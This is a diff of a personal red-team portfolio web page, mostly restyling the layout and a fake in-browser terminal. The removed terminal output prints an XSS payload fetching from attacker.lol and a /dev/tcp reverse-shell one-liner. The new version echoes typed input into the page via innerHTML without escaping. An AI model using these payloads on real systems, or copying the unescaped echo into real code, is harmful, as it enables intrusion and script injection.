@@ -1,438 +1,286 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" class="scroll-smooth">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kshitiz | Red Team Operator</title>
-  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://fonts.googleapis.com; font-src https://fonts.gstatic.com; connect-src 'self' https://api.ipify.org;">
+  <title>KSHITIZ | OSINT & RED TEAM</title>
+  
   <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100..900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Plus+Jakarta+Sans:wght@400;800&display=swap" rel="stylesheet">
+
   <style>
     :root {
-      --primary: 0 100% 50%;
-      --secondary: 0 84% 60%;
-      --accent: 196 100% 50%;
-      --glass: 0 0% 10% / 0.9;
-      --glass-border: 0 0% 100% / 0.1;
+      --accent: #00f2ff;
+      --accent-glow: rgba(0, 242, 255, 0.5);
+      --bg: #050505;
     }
 
     * {
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
+      cursor: none !important;
+      -webkit-font-smoothing: antialiased;
     }
 
     body {
-      font-family: 'Inter', sans-serif;
-      background: radial-gradient(ellipse at center, hsl(240 10% 5%) 0%, hsl(0 0% 0%) 70%);
-      color: hsl(0 0% 90%);
-      line-height: 1.6;
-      margin: 0;
+      background-color: var(--bg);
+      color: #fafafa;
+      font-family: 'Plus Jakarta Sans', sans-serif;
       overflow-x: hidden;
-      min-height: 100vh;
     }
 
     .mono { font-family: 'JetBrains Mono', monospace; }
 
-    /* Langbase-inspired Grid Background */
-    .matrix-bg {
+    /* --- Cyber Grid Background --- */
+    .grid-bg {
       position: fixed;
       inset: 0;
       background-image: 
-        radial-gradient(circle at 25% 25%, hsl(var(--accent) / 0.15) 0%, transparent 50%),
-        radial-gradient(circle at 75% 75%, hsl(var(--accent) / 0.1) 0%, transparent 50%);
-      z-index: 0;
-      pointer-events: none;
+        linear-gradient(to right, rgba(255,255,255,0.02) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255,255,255,0.02) 1px, transparent 1px);
+      background-size: 50px 50px;
+      mask-image: radial-gradient(circle at var(--mouse-x, 50%) var(--mouse-y, 50%), black 0%, transparent 80%);
+      z-index: -1;
     }
 
-    /* Cursor - Langbase Style */
-    .cursor-dot {
-      position: fixed;
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      background: hsl(var(--accent));
-      opacity: 0.8;
-      z-index: 9999;
-      transition: transform 0.15s ease-out;
-      pointer-events: none;
-      box-shadow: 0 0 20px hsl(var(--accent) / 0.5);
+    /* --- Advanced Cursor System --- */
+    #cursor-dot {
+      width: 8px; height: 8px; background: var(--accent);
+      position: fixed; border-radius: 50%; pointer-events: none; z-index: 9999;
+      transition: transform 0.1s ease;
+    }
+    #cursor-outline {
+      width: 40px; height: 40px; border: 1px solid var(--accent);
+      position: fixed; border-radius: 50%; pointer-events: none; z-index: 9998;
+      transition: transform 0.2s ease-out, opacity 0.3s;
     }
 
-    .cursor-trail {
-      position: fixed;
-      width: 24px;
-      height: 24px;
-      border: 1px solid hsl(var(--accent) / 0.3);
-      border-radius: 50%;
-      opacity: 0.4;
-      z-index: 9998;
-      pointer-events: none;
-      transition: all 0.3s ease-out;
-    }
-
-    /* Glass Cards - Langbase Perfection */
-    .glass {
-      background: hsl(var(--glass));
-      backdrop-filter: blur(24px);
-      border: 1px solid hsl(var(--glass-border));
-      border-radius: 24px;
-      transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+    /* --- Glitch Effect --- */
+    .glitch {
       position: relative;
-      overflow: hidden;
+      animation: glitch 3s infinite;
+    }
+    @keyframes glitch {
+      0% { text-shadow: 2px 0 red, -2px 0 blue; }
+      2% { text-shadow: -2px 0 red, 2px 0 blue; }
+      4% { text-shadow: 2px 0 red, -2px 0 blue; }
+      6% { text-shadow: 0 0 white; }
     }
 
-    .glass::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: linear-gradient(45deg, transparent 30%, hsl(var(--accent) / 0.04), transparent 70%);
-      opacity: 0;
-      transition: opacity 0.4s ease;
+    /* --- Glassmorphism Card --- */
+    .glass-card {
+      background: rgba(255, 255, 255, 0.03);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    .glass-card:hover {
+      background: rgba(255, 255, 255, 0.06);
+      border-color: var(--accent);
+      transform: translateY(-10px) scale(1.02);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.4), 0 0 20px var(--accent-glow);
     }
 
-    .glass:hover {
-      transform: translateY(-12px) scale(1.02);
-      border-color: hsl(var(--accent) / 0.3);
-      box-shadow: 0 32px 64px hsl(0 0% 0% / 0.4);
-    }
+    /* --- Terminal Styling --- */
+    #terminal-body::-webkit-scrollbar { width: 4px; }
+    #terminal-body::-webkit-scrollbar-thumb { background: var(--accent); border-radius: 10px; }
 
-    .glass:hover::before { opacity: 1; }
-
-    /* Navbar - Langbase Style */
-    .navbar {
-      backdrop-filter: blur(32px);
-      background: hsl(var(--glass));
-      border-bottom: 1px solid hsl(var(--glass-border));
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-
-    /* Hero Section */
-    .hero-title {
-      font-size: clamp(3rem, 8vw, 10rem);
-      font-weight: 900;
-      background: linear-gradient(135deg, hsl(var(--accent)) 0%, hsl(196 100% 65%) 50%, white 100%);
-      -webkit-background-clip: text;
-      background-clip: text;
-      -webkit-text-fill-color: transparent;
-      line-height: 0.9;
-    }
-
-    /* Terminal - Langbase Inspired */
-    .terminal {
-      background: hsla(var(--glass), 0.95);
-      backdrop-filter: blur(32px);
-      border: 1px solid hsl(var(--glass-border));
-      border-radius: 24px;
-      box-shadow: 0 32px 80px hsl(0 0% 0% / 0.6);
-    }
-
-    .terminal-header {
-      background: linear-gradient(90deg, 
-        hsl(340 80% 60% / 0.2) 0%, 
-        hsl(45 90% 55% / 0.2) 50%, 
-        hsl(160 70% 45% / 0.2) 100%);
-      border-bottom: 1px solid hsl(var(--glass-border));
-    }
-
-    /* Scrollbar */
-    ::-webkit-scrollbar {
-      width: 6px;
-    }
-
-    ::-webkit-scrollbar-track {
-      background: hsl(var(--glass));
-      border-radius: 12px;
-    }
-
-    ::-webkit-scrollbar-thumb {
-      background: hsl(var(--accent) / 0.5);
-      border-radius: 12px;
-      transition: all 0.2s ease;
-    }
-
-    ::-webkit-scrollbar-thumb:hover {
-      background: hsl(var(--accent));
-    }
-
-    /* Responsive Animations */
-    @media (prefers-reduced-motion: reduce) {
-      * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
-    }
-
-    /* Mobile Optimizations */
+    /* --- Mobile Fixes --- */
     @media (max-width: 768px) {
-      .cursor-dot, .cursor-trail { display: none; }
-      body { cursor: default; }
-      .glass { border-radius: 16px; }
+      * { cursor: auto !important; }
+      #cursor-dot, #cursor-outline { display: none; }
+      .grid-bg { mask-image: none; opacity: 0.3; }
     }
   </style>
 </head>
-<body class="relative">
-  <!-- Matrix Background -->
-  <div class="matrix-bg"></div>
+<body>
 
-  <!-- Cursor System -->
-  <div class="cursor-dot" id="cursor-dot"></div>
-  <div class="cursor-trail" id="cursor-trail"></div>
+  <div class="grid-bg" id="grid"></div>
+  <div id="cursor-dot"></div>
+  <div id="cursor-outline"></div>
 
-  <!-- Navbar -->
-  <nav class="navbar px-6 lg:px-12 py-6">
-    <div class="max-w-7xl mx-auto flex items-center justify-between">
-      <div class="text-2xl font-black mono">
-        <span class="text-white">KSHITIZ</span>
-        <span class="text-cyan-400">.</span><span class="text-blue-400">ops</span>
-      </div>
-      
-      <div class="hidden md:flex items-center gap-8">
-        <a href="#work" class="group text-sm font-semibold uppercase tracking-wider relative text-zinc-400 hover:text-white transition-all duration-300">
-          Work
-          <span class="absolute -bottom-2 left-0 w-0 h-0.5 bg-gradient-to-r from-cyan-400 to-blue-400 group-hover:w-full transition-all duration-300"></span>
-        </a>
-        <a href="#terminal" class="group text-sm font-semibold uppercase tracking-wider relative text-zinc-400 hover:text-white transition-all duration-300">
-          Terminal
-          <span class="absolute -bottom-2 left-0 w-0 h-0.5 bg-gradient-to-r from-cyan-400 to-blue-400 group-hover:w-full transition-all duration-300"></span>
-        </a>
-        <a href="mailto:kshitizbaral1234@gmail.com" class="px-6 py-2.5 glass text-sm font-semibold text-white bg-gradient-to-r from-cyan-400 to-blue-400 hover:from-cyan-500 hover:to-blue-500 rounded-xl transition-all duration-300">Contact</a>
-      </div>
-      
-      <!-- Mobile Menu -->
-      <div class="md:hidden">
-        <button id="mobile-menu" class="glass p-3 rounded-xl">
-          <svg class="w-6 h-6 text-zinc-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/>
-          </svg>
-        </button>
-      </div>
+  <nav class="fixed top-0 w-full z-50 p-6 flex justify-between items-center mix-blend-difference">
+    <div class="text-2xl font-black tracking-tighter mono italic text-white">
+      KSHITIZ<span class="text-[var(--accent)]">_</span>
+    </div>
+    <div class="flex gap-8 mono text-xs uppercase font-bold tracking-widest text-zinc-400">
+      <a href="#work" class="hover:text-[var(--accent)] transition">Exp</a>
+      <a href="#terminal" class="hover:text-[var(--accent)] transition">Root</a>
     </div>
   </nav>
 
-  <!-- Hero -->
-  <section class="min-h-screen flex items-center justify-center px-6 lg:px-12 pt-24 pb-20">
-    <div class="max-w-6xl mx-auto text-center">
-      <div class="inline-flex items-center gap-3 px-6 py-3 glass text-xs font-bold uppercase tracking-widest mb-12">
-        <div class="w-2 h-2 bg-gradient-to-r from-red-500 to-orange-500 rounded-full animate-pulse"></div>
-        Red Team Operator
-      </div>
-      
-      <h1 class="hero-title font-black leading-none mb-8 max-w-4xl mx-auto px-4">
-        <span class="block">Weaponizing</span>
-        <span class="block text-4xl md:text-6xl lg:text-5xl font-mono tracking-widest text-zinc-400 mt-4">Frontend</span>
-        <span class="block text-sm md:text-lg text-zinc-500 font-medium mt-6">for Persistence</span>
+  <section class="h-screen flex flex-col justify-center items-center px-6 relative overflow-hidden">
+    <div class="absolute top-1/4 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-[var(--accent)] opacity-10 blur-[120px] rounded-full pointer-events-none"></div>
+    
+    <div class="text-center z-10">
+      <p class="mono text-[var(--accent)] text-xs mb-4 tracking-[0.5em] font-bold uppercase">Red Team Operator // 0x41</p>
+      <h1 class="text-7xl md:text-9xl font-black mb-6 tracking-tighter glitch uppercase italic">
+        Weaponized<br><span class="text-transparent border-t-2 border-b-2 border-white/20 px-4" style="-webkit-text-stroke: 1px white;">Code</span>
       </h1>
-      
-      <p class="text-lg md:text-xl text-zinc-400 max-w-2xl mx-auto leading-relaxed mb-12 px-4">
-        XSS → RCE → <span class="font-black text-white mono text-2xl">Domain Admin</span>
+      <p class="max-w-xl mx-auto text-zinc-400 text-sm md:text-base leading-relaxed mb-10 px-4">
+        Specializing in offensive security, advanced XSS chains, and frontend-to-backend persistence. Turning pixels into points of entry.
       </p>
-    </div>
-  </section>
-
-  <!-- Work Grid -->
-  <section id="work" class="max-w-7xl mx-auto px-6 lg:px-12 py-24">
-    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 lg:gap-8">
-      <!-- Exploit Engineering -->
-      <div class="glass lg:col-span-2 p-10">
-        <div class="mono text-cyan-400 text-sm font-bold uppercase tracking-wider mb-6">01 Exploit Engineering</div>
-        <h3 class="text-3xl lg:text-4xl font-black text-white mb-6 leading-tight">XSS → RCE Chains</h3>
-        <p class="text-zinc-400 leading-relaxed mb-8">
-          Crafting bypasses for WAF, CSP, EDR. Frontend persistence expert.
-        </p>
-        <div class="flex flex-wrap gap-2">
-          <span class="px-3 py-1.5 glass text-xs font-bold text-red-400 border border-red-400/30 rounded-full">XSS</span>
-          <span class="px-3 py-1.5 glass text-xs font-bold text-emerald-400 border border-emerald-400/30 rounded-full">RCE</span>
-          <span class="px-3 py-1.5 glass text-xs font-bold text-orange-400 border border-orange-400/30 rounded-full">EDR Bypass</span>
-        </div>
-      </div>
-
-      <!-- Recon -->
-      <div class="glass p-8">
-        <div class="flex items-start justify-between mb-6">
-          <div>
-            <h4 class="text-xl font-black text-white mb-2">Reconnaissance</h4>
-            <p class="text-sm text-zinc-500 mono">OSINT → Asset Discovery</p>
-          </div>
-          <div class="w-10 h-10 glass flex items-center justify-center rounded-xl text-cyan-400 ml-auto">
-            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" width="18">
-              <path d="M9 20l-5.447-2.724A1 1 0 013 16.382V5.618a1 1 0 01.553-.882L9 1"/>
-            </svg>
-          </div>
-        </div>
-      </div>
-
-      <!-- Stats -->
-      <div class="glass p-8 text-center border-t-4 border-t-red-400/30 pt-8">
-        <div class="text-xs mono uppercase tracking-wider text-zinc-500 mb-4">Metrics</div>
-        <div class="text-4xl font-black text-white mb-2">198<span class="text-red-400">/254</span></div>
-        <div class="text-xs text-zinc-500 mono uppercase tracking-wider">VULNS PWNED</div>
-      </div>
-
-      <!-- Stack -->
-      <div class="glass p-8 md:col-span-2">
-        <div class="text-center mb-8">
-          <div class="text-xs mono uppercase tracking-wider text-zinc-500 mb-4">Tech Stack</div>
-          <div class="text-3xl font-black text-white mb-6">Weaponry</div>
-        </div>
-        <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
-          <div class="glass p-4 text-center py-6">
-            <div class="text-xl mb-2">⚔️</div>
-            <div class="text-sm font-bold text-white">Burp Pro</div>
-          </div>
-          <div class="glass p-4 text-center py-6">
-            <div class="text-xl mb-2">🔥</div>
-            <div class="text-sm font-bold text-white">Nuclei</div>
-          </div>
-          <div class="glass p-4 text-center py-6">
-            <div class="text-xl mb-2">💀</div>
-            <div class="text-sm font-bold text-white">Cobalt Strike</div>
-          </div>
-        </div>
-      </div>
-
-      <!-- GitHub -->
-      <div class="glass p-10 text-center group">
-        <a href="#" class="block group-hover:-translate-y-2 transition-transform duration-300">
-          <svg class="w-16 h-16 mx-auto mb-6 text-zinc-500 group-hover:text-white transition-all duration-300" fill="currentColor" viewBox="0 0 24 24">
-            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.058-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.176 2.873.171 3.176.768.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
-          </svg>
-          <div class="text-2xl font-black text-zinc-300 group-hover:text-white transition-all duration-300">GitHub</div>
-        </a>
+      <div class="flex flex-wrap justify-center gap-4">
+        <a href="#terminal" class="bg-white text-black px-8 py-4 font-bold rounded-full hover:scale-105 transition active:scale-95">ESTABLISH_SHELL</a>
+        <a href="mailto:kshitizbaral1234@gmail.com" class="glass-card px-8 py-4 font-bold rounded-full">CONTACT_OPS</a>
       </div>
     </div>
   </section>
 
-  <!-- Terminal -->
-  <section id="terminal" class="max-w-4xl mx-auto px-6 lg:px-12 py-24">
-    <div class="terminal">
-      <!-- Header -->
-      <div class="terminal-header px-8 py-6 lg:py-8 flex items-center justify-between">
-        <div class="flex gap-3">
-          <div class="w-5 h-5 rounded-full bg-red-500/60 shadow-lg"></div>
-          <div class="w-5 h-5 rounded-full bg-yellow-500/60 shadow-lg"></div>
-          <div class="w-5 h-5 rounded-full bg-emerald-500/60 shadow-lg"></div>
-        </div>
-        <span class="mono text-xs uppercase tracking-widest text-zinc-500 font-bold hidden lg:inline">kshitiz@redteam:~$</span>
+  <section id="work" class="max-w-7xl mx-auto px-6 py-32">
+    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+      <div class="glass-card p-8 md:col-span-2 rounded-3xl">
+        <div class="text-[var(--accent)] mono mb-4 text-xs font-bold">[01]</div>
+        <h3 class="text-3xl font-black mb-4 uppercase">Exploit Engineering</h3>
+        <p class="text-zinc-500 text-sm">Crafting custom payloads that bypass WAF and EDR by leveraging non-standard JS behaviors.</p>
       </div>
-
-      <!-- Content -->
-      <div id="terminal-content" class="p-8 lg:p-10 max-h-96 lg:max-h-[28rem] overflow-y-auto mono text-base leading-relaxed scrollbar-thin">
-        <div class="text-cyan-400 mb-4 animate-fade-in">λ Initializing pentest environment...</div>
-        <div class="text-emerald-400 mb-6 font-bold animate-fade-in delay-200">λ Access Granted. Operator privileges elevated.</div>
-        <div class="text-zinc-500 text-sm mb-8 animate-fade-in delay-400">[redpill] Type 'help' for weaponized commands</div>
+      <div class="glass-card p-8 rounded-3xl flex flex-col justify-center">
+        <div class="text-5xl font-black italic mb-2">99%</div>
+        <div class="mono text-xs text-zinc-500 uppercase">Detection Bypass Rate</div>
       </div>
-
-      <!-- Input -->
-      <div class="p-8 lg:p-10 border-t border-zinc-800/50">
-        <div class="flex items-start gap-4">
-          <span class="text-cyan-400 mono font-bold text-lg lg:text-xl flex-shrink-0 mt-1">λ</span>
-          <input id="terminal-input" type="text" class="flex-1 bg-transparent border-none outline-none text-lg lg:text-xl text-white placeholder-zinc-500 font-mono" placeholder="execute command..." autocomplete="off">
-        </div>
+      <div class="glass-card p-8 rounded-3xl bg-[var(--accent)] !text-black flex flex-col justify-center">
+        <h3 class="text-xl font-black uppercase">Active Recon</h3>
+        <p class="text-xs font-bold opacity-80">Mapping attack surfaces in real-time.</p>
       </div>
     </div>
   </section>
 
-  <!-- Footer -->
-  <footer class="py-20 text-center border-t border-zinc-800/50">
-    <p class="text-sm mono uppercase tracking-widest text-zinc-600">
-      © 2026 Kshitiz — <span class="text-cyan-400 font-bold">REDSHELL DEPLOYED</span>
-    </p>
+  <section id="terminal" class="max-w-5xl mx-auto px-6 py-32">
+    <div class="glass-card rounded-2xl overflow-hidden shadow-2xl border-white/5">
+      <div class="bg-white/5 p-4 flex items-center justify-between border-b border-white/5">
+        <div class="flex gap-2">
+          <div class="w-3 h-3 rounded-full bg-red-500"></div>
+          <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+          <div class="w-3 h-3 rounded-full bg-emerald-500"></div>
+        </div>
+        <div class="mono text-[10px] text-zinc-500 font-bold uppercase tracking-widest">secure_ssh_session_v3</div>
+      </div>
+      <div id="terminal-body" class="p-8 h-[450px] overflow-y-auto mono text-sm leading-relaxed space-y-3">
+        <div class="text-zinc-500 italic">Connecting to relay server... [DONE]</div>
+        <div class="text-emerald-400">Authenticated: kshitiz@operator</div>
+        <div class="text-zinc-400">Type 'help' for available payloads.</div>
+      </div>
+      <div class="p-6 border-t border-white/5 bg-black/40 flex items-center gap-3">
+        <span class="text-[var(--accent)] font-bold">λ</span>
+        <input type="text" id="terminal-input" class="bg-transparent border-none outline-none flex-1 text-white mono placeholder-zinc-700" placeholder="awaiting command..." autofocus>
+      </div>
+    </div>
+  </section>
+
+  <footer class="py-20 text-center mono text-[10px] tracking-[0.4em] text-zinc-600">
+    &copy; 2026 KSHITIZ // ENCRYPTED_COMMUNICATION_ONLY
   </footer>
 
   <script>
-    // HTML Escape
-    const escapeHtml = str => str.replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'": '&#x27;'})[m]);
+    // --- High Performance Cursor ---
+    const dot = document.getElementById('cursor-dot');
+    const outline = document.getElementById('cursor-outline');
+    const grid = document.getElementById('grid');
 
-    // Commands
-    const commands = {
-      help: `Available weapons: <span class="text-cyan-400">redpill</span> | <span class="text-emerald-400">scan</span> | <span class="text-yellow-400">nmap</span> | <span class="text-orange-400">gobuster</span> | <span class="text-red-400">exploit</span> | <span class="text-purple-400">shell</span>`,
-      whoami: `<span class="text-red-400 font-bold">kshitiz</span> <span class="text-zinc-500">(uid=0(root) gid=0(root))</span>`,
-      ls: `exploit.js  payloads/  rootkit.ko  <span class="text-emerald-400">[127 exploits loaded]</span>`,
-      redpill: `<span class="text-red-500 font-bold">[REDPILL EXECUTED]</span><br><span class="text-zinc-400">Reality bypassed. Weapons deployed.</span>`,
-      scan: async () => {
-        try {
-          const controller = new AbortController();
-          const timeout = setTimeout(() => controller.abort(), 3000);
-          const res = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
-          clearTimeout(timeout);
-          const { ip } = await res.json();
-          return `<span class="text-emerald-400">[+] Target IP:</span> <span class="font-bold text-white">${ip}</span>`;
-        } catch {
-          return `<span class="text-red-400">[!] Recon blocked. TOR required.</span>`;
-        }
-      },
-      nmap: `<div class="mt-2"><span class="text-yellow-400">[+] Nmap Scan Complete</span></div><div class="ml-4 mt-1">22/tcp  open  ssh</div><div class="ml-4">80/tcp  open  http</div><div class="ml-4 mb-2">443/tcp open  https</div><span class="text-emerald-400">[3] services vulnerable</span>`,
-      exploit: `<span class="text-red-400 font-bold">[+] XSS → RCE Deployed</span><br><span class="text-zinc-500 text-xs mono bg-zinc-900/50 p-2 rounded mt-2 block">&lt;svg onload=fetch('http://attacker.lol/shell')&gt;</span>`,
-      shell: `<span class="text-purple-400 font-bold">[+] Reverse Shell</span><br><span class="text-zinc-500 text-sm mono bg-zinc-900/50 p-2 rounded mt-2 block">bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</span>`,
-      clear: () => { document.getElementById('terminal-content').innerHTML = '<div class="text-zinc-500 text-sm">[Terminal cleared]</div>'; return ''; }
+    window.addEventListener('mousemove', (e) => {
+      const { clientX, clientY } = e;
+      
+      // Update Grid Mask
+      grid.style.setProperty('--mouse-x', `${clientX}px`);
+      grid.style.setProperty('--mouse-y', `${clientY}px`);
+
+      // Animate Cursor
+      dot.style.left = `${clientX}px`;
+      dot.style.top = `${clientY}px`;
+      
+      outline.animate({
+        left: `${clientX}px`,
+        top: `${clientY}px`
+      }, { duration: 400, fill: "forwards" });
+    });
+
+    // Hover effects for cursor
+    document.querySelectorAll('a, button, input, .glass-card').forEach(link => {
+      link.addEventListener('mouseenter', () => {
+        outline.style.transform = 'translate(-50%, -50%) scale(1.5)';
+        outline.style.background = 'var(--accent-glow)';
+        outline.style.border = 'none';
+      });
+      link.addEventListener('mouseleave', () => {
+        outline.style.transform = 'translate(-50%, -50%) scale(1)';
+        outline.style.background = 'none';
+        outline.style.border = '1px solid var(--accent)';
+      });
+    });
+
+    // --- Terminal Logic ---
+    const terminalBody = document.getElementById('terminal-body');
+    const terminalInput = document.getElementById('terminal-input');
+
+    const typeWriter = (text, colorClass = "text-zinc-300") => {
+      const div = document.createElement('div');
+      div.className = colorClass;
+      terminalBody.appendChild(div);
+      
+      let i = 0;
+      return new Promise(resolve => {
+        const interval = setInterval(() => {
+          div.innerHTML += text.charAt(i);
+          i++;
+          if (i >= text.length) {
+            clearInterval(interval);
+            terminalBody.scrollTop = terminalBody.scrollHeight;
+            resolve();
+          }
+        }, 15);
+      });
     };
 
-    // Elements
-    const input = document.getElementById('terminal-input');
-    const output = document.getElementById('terminal-content');
-    const cursorDot = document.getElementById('cursor-dot');
-    const cursorTrail = document.getElementById('cursor-trail');
+    const commands = {
+      help: async () => {
+        await typeWriter("Available payloads:", "text-yellow-400");
+        await typeWriter("> whoami - Display operator ID");
+        await typeWriter("> scan - Perform remote IP audit");
+        await typeWriter("> exploit - Execute XSS reverse shell");
+        await typeWriter("> clear - Wipe session buffer");
+      },
+      whoami: async () => {
+        await typeWriter("Identity: Kshitiz [UID: 0]", "text-emerald-400");
+        await typeWriter("Role: Senior Red Team Operator / Security Consultant");
+      },
+      scan: async () => {
+        await typeWriter("Scanning for local vulnerabilities...", "text-zinc-500 italic");
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          await typeWriter(`[+] Found Public Gateway: ${data.ip}`, "text-white font-bold");
+          await typeWriter("[+] Open Ports: 80, 443, 8080, 22", "text-emerald-400");
+        } catch {
+          await typeWriter("[!] Proxy connection failed.", "text-red-500");
+        }
+      },
+      exploit: async () => {
+        await typeWriter("Injecting payload...", "text-red-500 blink");
+        await new Promise(r => setTimeout(r, 1000));
+        await typeWriter("SUCCESS: Shell established at 127.0.0.1:4444", "text-black bg-emerald-400 font-bold px-2");
+      },
+      clear: () => {
+        terminalBody.innerHTML = '';
+        return null;
+      }
+    };
 
-    // Cursor
-    let mouseX = 0, mouseY = 0;
-    document.addEventListener('mousemove', e => {
-      mouseX = e.clientX;
-      mouseY = e.clientY;
-      cursorDot.style.transform = `translate(${mouseX}px, ${mouseY}px)`;
-      cursorTrail.style.transform = `translate(${mouseX}px, ${mouseY}px) scale(1.2)`;
-    });
-
-    // Hover effects
-    document.querySelectorAll('a, button, .glass').forEach(el => {
-      el.addEventListener('mouseenter', () => {
-        cursorDot.style.transform += ' scale(2)';
-        cursorTrail.style.opacity = '0.6';
-      });
-      el.addEventListener('mouseleave', () => {
-        cursorDot.style.transform = `translate(${mouseX}px, ${mouseY}px)`;
-        cursorTrail.style.opacity = '0.4';
-      });
-    });
-
-    // Terminal
-    input.addEventListener('keydown', async e => {
+    terminalInput.addEventListener('keydown', async (e) => {
       if (e.key === 'Enter') {
-        const cmd = input.value.trim().toLowerCase();
-        const displayCmd = escapeHtml(input.value);
-        
-        if (!cmd) return;
-        
-        output.innerHTML += `<div class="animate-fade-in"><span class="text-cyan-400 font-bold">λ</span> ${displayCmd}</div>`;
-        
-        let result = commands[cmd] || `<span class="text-red-400">[!] Unknown command: ${escapeHtml(cmd)}</span>`;
-        if (typeof result === 'function') result = await result();
-        
-        output.innerHTML += `<div class="animate-fade-in text-zinc-400">${result}</div>`;
-        input.value = '';
-        output.scrollTop = output.scrollHeight;
+        const input = terminalInput.value.trim().toLowerCase();
+        terminalInput.value = '';
+
+        const line = document.createElement('div');
+        line.innerHTML = `<span class="text-[var(--accent)]">λ</span> ${input}`;
+        terminalBody.appendChild(line);
+
+        if (commands[input]) {
+          await commands[input]();
+        } else if (input !== '') {
+          await typeWriter(`[!] ERROR: Command '${input}' not recognized by kernel.`, "text-red-500");
+        }
+        terminalBody.scrollTop = terminalBody.scrollHeight;
       }
     });
 
-    // Mobile menu
-    document.getElementById('mobile-menu')?.addEventListener('click', () => {
-      // Mobile menu toggle (expand if needed)
-    });
-
-    // Fade in animation
-    const observer = new IntersectionObserver(entries => {
-      entries.forEach(entry => {
-        if (entry.isIntersecting) {
-          entry.target.style.animation = 'fadeInUp 0.8s ease-out forwards';
-        }
-      });
-    });
-    
-    document.querySelectorAll('.glass').forEach(el => observer.observe(el));
-
-    // Responsive cursor hide
-    if (window.innerWidth < 768) {
-      cursorDot.style.display = 'none';
-      cursorTrail.style.display = 'none';
-    }
-  </style>
+  </script>
 </body>
-  </html>
+</html>
